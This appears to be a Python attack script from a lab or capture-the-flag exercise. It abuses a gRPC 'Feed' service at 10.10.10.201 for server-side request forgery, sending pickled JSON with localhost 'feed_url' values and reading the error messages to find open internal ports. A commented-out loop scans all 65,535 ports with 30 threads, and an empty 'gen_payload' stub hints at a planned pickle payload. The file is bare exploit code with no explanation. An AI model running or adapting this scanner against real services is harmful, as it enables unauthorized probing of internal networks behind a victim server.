import grpc
import service_pb2
import service_pb2_grpc
import requests
import pickle
import os
from base64 import b64encode
import concurrent.futures

# def gen_payload(port):


def port_check(port):
    port = str(port)
    json = '{"feed_url": "http://localhost:' + port + '" }'
    # print(json)
    channel = grpc.insecure_channel('10.10.10.201:9000')
    stub = service_pb2_grpc.PrintStub(channel)
    try:
        payload = pickle.dumps(json)
        response = stub.Feed(service_pb2.Contents(data=b64encode(payload)))
    except Exception as e:
        if 'HTTP' in str(e):
            return port, "OPEN"
        return port, 'Closed'
    print(response)
    return port, "unknown"


# with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
#     jobs = []
#     for port in range(0, 65535):
#         jobs.append(executor.submit(port_check, port))

#     for future in concurrent.futures.as_completed(jobs):
#         port, output = future.result()
#         print(f"{output} - {port}")
print(port_check('8983'))
# channel = grpc.insecure_channel('10.10.10.201:9000')
# stub = service_pb2_grpc.PrintStub(channel)
# payload = pickle.dumps(port_check())
# response = stub.Feed(service_pb2.Contents(data=b64encode(payload)))
